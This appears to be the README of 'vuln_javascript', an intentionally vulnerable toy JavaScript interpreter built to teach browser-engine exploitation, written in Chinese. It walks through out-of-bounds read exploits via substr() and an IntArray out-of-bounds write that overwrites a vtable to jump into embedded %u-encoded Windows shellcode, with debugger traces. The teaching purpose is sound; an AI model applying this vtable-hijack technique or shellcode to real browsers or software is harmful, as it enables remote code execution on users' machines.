###vuln_javascript
![vuln_javascript](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/vuln_javascript_logo.jpg)

---

`vuln_javascript` 模拟真实的浏览器的JavaScript 环境,通常地,我们使用JavaScript 来精心设计一些操作DOM 和其它浏览器对象的逻辑代码时会使得浏览器产生崩溃,针对不同种类的崩溃有不同的利用方法.`vuln_javascript` 收集了UAF 和越界读写两种漏洞类型,希望`vuln_javascript` 可以帮助更多安全爱好者理解浏览器内核漏洞原理和细节还有相关的Exploit 编写技巧.由于`vuln_javascript` 并不是真正的JavaScript 执行环境,所以现在只支持执行JavaScript 语句很少,可执行的语句如下:<br/><br/>

    支持的document 对象 :
    document.createElement();  创建HTML 元素
    document.appendChild();    附加到页面上显示

    可以创建的HTML 元素:
    img                        img 图片元素
    div                        div 容器元素

    支持的元素内部函数 :
    element.remove();          删除元素
    element.getAttribute();    获取属性
    element.setAttribute();    设置属性
    
    支持的对象内部函数 :
    string.substr(offest);     截取字符串
    string.substr(offest,len); 截取字符串
    string.length();           获取字符串长度
    array.length();            获取数组长度

    支持的JavaScript 基本语句 :
    var var_name=expression;   变量声名
    for (1;2;3) {code_block};  for 循环语句
    if {code_block} [else if {code_line;] [else {code_block}]            if 判断语句
    function function_name(function_argment_list) {function_code_block}  函数声名语句

    支持的表达式计算 :
    + - * / ()                 四则运算
    ''                         使用'' 号来表示字符串
    == != > >= ...             表达式判断
    call();                    函数调用
    new IntArray();            生成数字数组
    new IntArray(length);      生成长度为length 的数字数组
    new IntArray(num1,num2);   生成长度为2 且包含内容为num1,num2 的数字数组
    new ObjArray();            生成对象数组
    new ObjArray(length);      生成长度为length 的对象数组

    支持的元素方法 :
    var_name.substr(l,b);      元素函数调用
    var_name[1];               设置数组索引

    其它的JavaScript 函数 :
    console.log();             输出数据

###vuln_javacript 使用

---

`vuln_javacript.exe` 编译完成的EXE 在`/Release` 路径下可以找到(编译IDE 环境:VC++ 6 ,没有导入任何其它库).<br/><br/>
`vuln_javacript.exe` 可以选择带参数运行,指定的参数为即将要执行的JavaScript 代码文件路径,例子:<br/><br/>
![buffer_in_memory](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/example_using_run_file.png)<br/><br/>
`vuln_javacript.exe` 也可以不带参数运行,默认以控制台的形式执行代码,例子:<br/><br/>
![buffer_in_memory](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/example_using_console_mode.png)<br/><br/>
退出控制台模式的命令为`quit` ..<br/><br/>
**WARNING!** 有个关于Array 使用的Bug (应用程序崩溃),因为VC++ 6 本身的STL 库设计问题,以后会移植到VC++ 8 ..

###vuln_javascript 执行例子

---

Example 1 -- 简单的计算: <br/>

    var num_1;
    var num_2=123;
    num_1=321;
    console.log(num_1+num_2);

Example 2 -- 简单的if 判断: <br/>

    var array=new IntArray(10);
    if (array.length())
        console.log('alloc success');
    else
	   console.log('alloc falut');

Example 3 -- 简单的函数调用: <br/>

    function output(info) {
        console.log(info);
    }
        
    function calcu() {
	   var a=1;
	   for (var index=1;index<=10;index+=1)
            a+=index;
	   return a;
    }

    output(calcu());
    console.log('exit!..');

###漏洞利用部分

---

####TIPS! 所有的测试都在`Debug` 选项下的`Debug` 模式下进行

####1.UaF 原理部分(Use after Free ,重复使用已经被释放了的类)<br/><br/>
所有的HTML 元素在浏览器的内部都是一个类的实例.在`vuln_javascript` 中,所有关于HTML 元素的操作都在`javascript_element.cpp` 这个文件里面.img 和div 元素继承HTML 基础元素,同时HTML 基础元素类向下提供一些HTML 元素的通用函数实现方法(也就是`getAttribute()` ,`setAttribute()` 和`remove()`).<br/>
Uaf 的原理是:**当HTML 元素调用了remove() 删除自身并且在堆中释放内存之后,在接下来的代码执行流程中再次调用已经被释放的类时,将会引发释放后重用的漏洞(Use after Free)**<br/><br/>


####2.Read /Write Out of Bound 原理部分(越界读写)<br/><br/>
假设我们有两个数组:<br/><br/>
![buffer](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/buffer.png)<br/><br/>
在真实的环境中,这两个数组是有可能是相连的<br/><br/>
![buffer_in_memory](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/buffer_in_memory.png)<br/><br/>
通常情况下,我们都可以正常访问buffer1 里面的数据,假设往buffer1 里面读写数据的时候的时候一不小心就越过了buffer1 本来的长度到了buffer2 呢?<br/><br/>
![read_write_out_of_buffer1](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_write_out_of_buffer1.png)<br/><br/>

Exapmle 1 -- String 对象substr() 越界读取:<br/><br/>
**Exploit** :<br/>
```javascript
var first_string='test string';
var read_string='read me ...';

var read_string_length=first_string.substr(0x28,4);
var read_string_data=first_string.substr(0x30,read_string.length());
console.log('read_string_length:'+read_string_length);
console.log('read_string_data:'+read_string_length);
```
当用户声名一个String 类型的变量时,JavaScript 会申请堆内存来保存String 对象的数据<br/>
```javascript
var string='test string';
console.log(string);
```
![base_string_in_heap](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/base_string_in_heap.png)<br/><br/>
根据结构可知:0x0CF1D870 中保存的为字符串长度,0x0CF1D874 为字符串的保存地址,0x0CF1D878 为字符串的数据地址<br/><br/>
![base_string_in_heap_detail](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/base_string_in_heap_detail.png)<br/><br/>
substr() 越界读取示例:<br/>
```javascript
var string='test string';
var read_out_of_bound=string.substr(string.length(),10);
console.log(read_out_of_bound);
```
运行情况:<br/><br/>
![read_out_of_bound_execute](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_execute.png)<br/><br/>
接下来我们到`javascript_function.cpp string_object_substr()` 里面设置断点,执行程序解析脚本,观测数据复制情况<br/><br/>
![read_out_of_bound_memcpy](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_memcpy.png)<br/><br/>
可以看到,`substr()` 的`offset` 参数的设置使得`memcpy()` 直接读取到string 对象的NULL 结束符的位置,然后到`javascript_function.cpp console_log()` 中设置断点,可以看到即将要输出到控制台的read_out_of_bound 对象的内容<br/><br/>
![read_out_of_bound_output](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_output.png)<br/><br/>
那么我们可以构造两个String 对象,让第一个String 越界读取到第二个String 对象里面,当我们声名了两个String 对象时,堆里面的内容如下<br/>
声名两个String 对象示例代码:
```javascript
var first_string='test string';
var read_string='read me ...';
console.log('exit');
```
![two_string_in_heap](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/two_string_in_heap.png)<br/><br/>
由于这两个字符串在堆里面是连续的,那么我们可以构造好`first_string.substr()` 的调用参数读取到`read_string` 里面的内容,首先分析一下substr() 的参数应该如何构造<br/>
first_string 越界读写测试代码一:
```javascript
var first_string='test string';
var read_string='read me ...';
var read_data=first_string.substr(0,4);
console.log(read_data);
```
现在到回到`javascript_function.cpp string_object_substr()` 里面设置断点,可以看到`memcpy()` 将要从`first_string` 保存数据的地址中开始复制数据<br/>
![read_out_of_bound_memcpy_exploit](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_memcpy_exploit.png)<br/><br/>
现在,可以这样计算,`read_string` 保存数据的地址为0xCEFD848 ,`first_string` 保存数据的地址为0xCEFD818 ,地址偏移了0x30 ,于是可以构造`first_string.substr(0x30,4);` 读取到`read_string` 里面的内容,继续观察`javascript_function.cpp string_object_substr()` 的执行情况<br/><br/>
first_string 越界读写测试代码二:
```javascript
var first_string='test string';
var read_string='read me ...';
var read_data=first_string.substr(0x30,4);
console.log(read_data);
```
![read_out_of_bound_memcpy_read_data](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_memcpy_read_data.png)<br/><br/>
可以看到,我们已经控制`substr()` 读取到了`read_string` 的内容了<br/><br/>
![read_out_of_bound_memcpy_read_data_output](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_memcpy_read_data_output.png)<br/><br/>
由于我们读取的是4 字节的数据,要想完全读取`read_data` 的内容,只需要把`first_string.substr(0x30,4)` 修改为`first_string.substr(0x30,read_string.length())` 即可<br/><br/>
但是只读到内容并没有什么用途,根据之前的分析,我们可以跨过去读取一个对象的信息,比如这样:<br/>
substr() 越界读取object 虚函数表:
```javascript
var first_string='test string';
var read_object=document.createElement('img');
var read_data=first_string.substr(0x50,4);
console.log(read_data);
```
现在,请到`javascript_element.cpp base_element::base_element()` 中设置断点,中断时观察堆里面的数据,可以看到`first_string` 和`read_object` 对象的地址偏移动从原来的0x30 变成了0x50 (`0xD07D868-0xD07D810=0x50`)<br/><br/>
![read_out_of_bound_object](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_object.png)<br/><br/>
然后再到`javascript_function.cpp string_object_substr()` 中观察`memcpy()` ,发现虚函数表已经复制到变量里面中去了<br/><br/>
![read_out_of_bound_read_object_virtual_table](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_read_object_virtual_table.png)<br/><br/>
因为`substr()` 是以String 对象读取出来的,所以会输出的时候会显示错误<br/><br/>
![read_out_of_bound_read_object_output](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/read_out_of_bound_read_object_output.png)<br/><br/>

Example 2 -- IntArray 数组越界读写<br/><br/>
**Exploit** 1 获取IntArray 类基地址:
```javascript
var first_array=new IntArray(4);
var read_array=new IntArray(1,2,3,4);

console.log(first_array[0xA]);
```
上面已经很清楚地述说了越界读取数据的原理,同样地,IntArray 整数数组的读写也存在越界,只不过接下来我们要利用写的方式来覆盖IntArray 原来的虚函数表,利用原理是构造一个指向到我们的Shellcode 的虚函数表来覆盖它,然后再调用指定的函数,控制代码流跳到Shellocode 中,详细的利用代码如下<br/><br/>
**Exploit** 2 远程代码执行:
```javascript
var write_array=new IntArray(4);
var exploit_array=new IntArray(1,2,3,4);
var read_exploit_virutal_table_array=new IntArray(4);
var exploit_virutal_table=new IntArray(0,0,1);
var read_shellcode_address=new IntArray(4);
var shellcode='%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u006A%u2E68%u7865%u6865%u6163%u636C%ue589%u4dfe%u3153%u50c0%uff55%u00d7';
exploit_virutal_table[0x2]=read_shellcode_address[0x27];
write_array[0xA]=read_exploit_virutal_table_array[0xD];
exploit_array.length();
```
首先,通过`read_shellcode_address` 的越界读取漏洞把`shellcode` 中的保存数据的地址读取出来,然后存放到构造虚函数表中(`exploit_virutal_table`),接下来使用`read_exploit_virutal_table_array` 越界读取`exploit_virutal_table` 中储存数据的地址,把读取出来的地址通过`write_array` 越界写数据到`exploit_array` 的虚函数表地址中,使得`exploit_virutal_table` 中精心构造好的虚函数表覆盖掉原来`exploit_array IntArray 对象`的虚函数表,最后通过`exploit_array.length()` 触发`exploit_array 对象` 调用虚函数,从而控制程序最后执行到`shellcode` 变量中储存的二进制代码,以下为示意图:<br/><br/>
![write_out_of_bound_exploit](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_exploit.png)<br/><br/>
调试代码时,在`javascript_array.cpp base_array::get_index` 和`javascript_array.cpp base_array::set_index` 设置断点,观察4 次IntArray 数组在堆中读写数据的细节<br/><br/>
由于`exploit_array` 和`exploit_virutal_table` 会初始化IntArray 数组的内容,所以开始的几次断点会中断到`javascript_array.cpp base_array::set_index` 中,当程序执在`javascript_array.cpp base_array::get_index` 处中断,意味着执行到`read_shellcode_address[0x27]` 的读取,从0xCCADA84 处读取到`shellcode` 的数据指针(**0x0CCAD9E8+0x27*0x4=0xCCADA84**)<br/><br/>
![write_out_of_bound_read_shellcode](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_read_shellcode.png)<br/><br/>
F9 执行到下一处断点,在`javascript_array.cpp base_array::set_index` 中断,此时执行到`exploit_virutal_table[0x2]` 的数据写入,把刚才读取到的虚函数表地址保存到数组中,内存空间如下<br/><br/>
![write_out_of_bound_build_virtual_table](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_build_virtual_table.png)<br/><br/>
继续F9 执行,在`javascript_array.cpp base_array::get_index` 中断,此时执行到`read_exploit_virutal_table_array[0xD]` 的越界读取,读取`exploit_virutal_table` 保存数据的地址(0x0CCAD908+0xD\*0x4=0x0CCAD93C ,得到0x0CCAD978 也就是刚才构造好的`exploit_virutal_table` 的数据内容地址)<br/><br/>
![write_out_of_bound_read_build_virtual_table_data_address](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_read_build_virtual_table_data_address.png)<br/><br/>
继续F9 执行,在`javascript_array.cpp base_array::set_index` 中断,执行到`write_array[0xA]` 的越接写入,刚好把刚才读出来的地址写到`exploit_array` 的虚函数表地址里面<br/><br/>
覆盖地址前:<br/>
![write_out_of_bound_rewrite_exploit_array_virtual_table_before](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_rewrite_exploit_array_virtual_table_before.png)<br/>
覆盖地址后:<br/>
![write_out_of_bound_rewrite_exploit_array_virtual_table_after](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_rewrite_exploit_array_virtual_table_after.png)<br/><br/>
最后一步就是调用`exploit_array` 的`length()` 引发虚函数的调用,现在到`javascript_function.cpp array_object_length() set_variant(JAVASCRIPT_VARIANT_KEYNAME_FUNCTION_RESULT,(void*)array_class->length(),NUMBER); ` 中设置断点,并且切换到汇编模式下调试(在代码窗口里面右键鼠标选择跳转到汇编).<br/><br/>
**WARNING!**这里不小心重新启动了程序,地址会有变化,最后的部分主要是说明`exploit_array` 调用虚函数是如何根据我们构造的数据去走的<br/><br/>
往下执行`mov eax,dword ptr [ebp-4]` 读取出`exploit_array` 的类地址<br/><br/>
`mov edx,dword ptr [eax]` 读取出虚函数表地址,可见地址已经被写成0x0CF0D978 <br/><br/>
![write_out_of_bound_exploit_array_detail1](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_exploit_array_detail1.png)<br/><br/>
执行到`call dword ptr [edx+8]` ,从虚函数表里面读取虚函数`length()` 的地址,此时`length()` 地址已经被改写到0x0CF0DA88 <br/><br/>
![write_out_of_bound_exploit_array_detail2](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_exploit_array_detail2.png)<br/><br/>
所以接下来会执行`call 0x0CF0DA88` ,也就是执行`shellcode` 保存的数据<br/><br/>
![write_out_of_bound_exploit_array_detail3](https://raw.githubusercontent.com/lcatro/vuln_javascript/master/pic/write_out_of_bound_exploit_array_detail3.png)<br/><br/>

